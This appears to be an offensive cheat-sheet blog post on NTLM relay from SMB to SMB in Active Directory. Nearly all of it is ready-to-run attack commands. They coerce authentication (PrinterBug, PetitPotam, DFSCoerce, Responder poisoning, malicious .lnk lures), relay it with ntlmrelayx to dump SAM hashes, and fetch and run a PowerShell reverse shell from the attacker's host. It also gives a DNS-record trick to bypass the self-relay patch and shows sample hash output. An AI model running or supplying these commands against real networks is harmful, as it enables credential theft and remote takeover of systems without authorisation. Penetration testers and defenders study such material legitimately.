---
title: NTLM relay SMB To SMB
date: 2026-06-12 21:37:29
categories:
  - Active Directory
  - Exploitation
  - NTLM Relay
tags:
  - netexec
  - impacket-ntlmrelayx
  - printerbug
  - PetitPotam
  - Responder
  - DFSCoerce
---

# Requirements

>   * The machine we relay from should be vulnerable to one of these coercion methods
>
>   * `SMB signing` on the machine we relay to should be `disabled` or `enabled`.
>
>

![NTLM Relay SMB to SMB](/img/ntlm-relay-smb-to-smb.png)

> ➜ Self-relay (relaying back to the same host that authenticated) has been patched since MS08-068, the machine we relay to must therefore be a different machine from the machine we relay from.

> ➜ We can bypass this restriction by adding a crafted DNS record on the DC, formatted as `<hostname>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`

```bash
bloodyAD -u <user> -p <password> -d <domain> -k --host <dc_hostname> add dnsRecord <hostname>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <attacker_ip>
```

> This makes the target’s SMB client resolve our attacker IP as itself, so when `lsass.exe` (running as SYSTEM) is coerced via PetitPotam, the relay now succeeds back to the same host, giving us a SAM/LSA dump on the DC.

# Enumeration

#### Enumerate Machines With `signing:False`

> RunFinger.py

```bash
python3 RunFinger.py -i ip-range
```

> NetExec

```bash
nxc smb ip-range --gen-relay-list relayTargets.txt
```

> Nmap

```bash
nmap -Pn --script=smb2-security-mode.nse -p 445 ip-range --open
```

# Exploitation

### Coerce Method : Coerce Machine Account

> ➜ We only need domain user credentials

##### PrinterBug (MS-RPRN)

```bash
python3 printerbug.py <domain>/<user>:<password>@<target_ip> <attacker_ip>
```

##### PetitPotam (MS-EFSR)

> ➜ if the system is not patched for CVE-2021-36942 we don’t need credentials

```bash
python3 PetitPotam.py <attacker_ip> <target_ip> -u <user> -p <password> -d <domain>
```

##### DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u <user> -p <password> <attacker_ip> <target_ip>
```

##### Coercer (automated, all three above)

```bash
Coercer coerce -t <target_ip> -l <attacker_ip> -u <user> -p <password> -d <domain> -v --always-continue
```

##### NetExec coerce_plus

```bash
nxc smb <target_ip> -u <user> -p <password> -M coerce_plus -o LISTENER=<attacker_ip>
```

### Coerce Method : Coerce User Account

> ➜ We need only `Write access` to a shared folder

##### ntlm_theft

```bash
python3 ntlm_theft.py -g all -s <attacker_ip> -f <payload_name>
```

```bash
smbclient //<target_ip>/<share> -U <user>

smb: \> put <payload_name>.lnk
```

##### Slinky ( nxc module)

```bash
nxc smb <target_ip> -u <user> -p <password> -M slinky -o SERVER=<attacker_ip> NAME=<lure_name>
```

##### MSSQL UNC path coercion

```bash
mssqlclient.py 'inlanefreight/plaintext$:PASS@<target_ip>' -windows-auth

SQL (plaintext$ guest@master)> xp_dirtree \\<attacker_ip>\test.txt
```

##### LLMNR / NBT-NS / mDNS poisoning

> Unlike the other coerce methods we can’t choose who gets coerced, we wait for any user to mistype a hostname then responder answer the request

> ➜ Disable Responder’s SMB and HTTP servers (so `ntlmrelayx` can use them):

```bash
sed -i "s/SMB = On/SMB = Off/" Responder.conf
sed -i "s/HTTP = On/HTTP = Off/" Responder.conf
```

> ➜ Start Responder to poison name-resolution broadcasts:

```bash
sudo python3 Responder.py -I <interface>
```

### Relay & Post-Exploitation

> Regardless of which coercion method above was used, the captured SMB authentication is relayed with the same way

> Single target

```bash
sudo ntlmrelayx.py -t <target_ip> -smb2support
```

```bash
sudo ntlmrelayx.py -t smb://<hostname>.<domain> -smb2support
```

> Multiple Machines

> We need to update `relayTargets.txt `

```bash
smb://IP
smb://hostname.domain.local
```

> Then

```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
```

##### Normal User

> If the relayed account is a normal user (non-admin), we can’t SAM dump or RCE , we can only use `-i` for an interactive SMB session and access shares that the relayed user can read and write.

```bash
ntlmrelayx.py -t <target_ip> -smb2support -i
```

```bash
nc -nv 127.0.0.1 11000

# shares
```

##### Admin User

> If the relayed account is a local `admin user` on the machine that we relayed to, `ntlmrelayx` will automatically `dump SAM`

```bash
[*] Authenticating against smb://<target_ip> as <DOMAIN>/<USER> SUCCEED
[*] Target system bootKey: 0x563136fa4deefac97a5b7f87dca64ffa
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> Command execution / reverse shell

```bash
sudo ntlmrelayx.py -t <target_ip> -smb2support -c
"powershell -c IEX(New-Object NET.WebClient).DownloadString('http://<attacker_ip>:Port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port Port"
```

##### Socks

> If we want the relayed session to keep alive we can use `-socks` flag with `ntlmrelayx`

```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
```

> Then we can use any tool with `proxychains`

```bash
proxychains4 -q smbexec.py <domain>/<user>@<target_ip> -no-pass
```
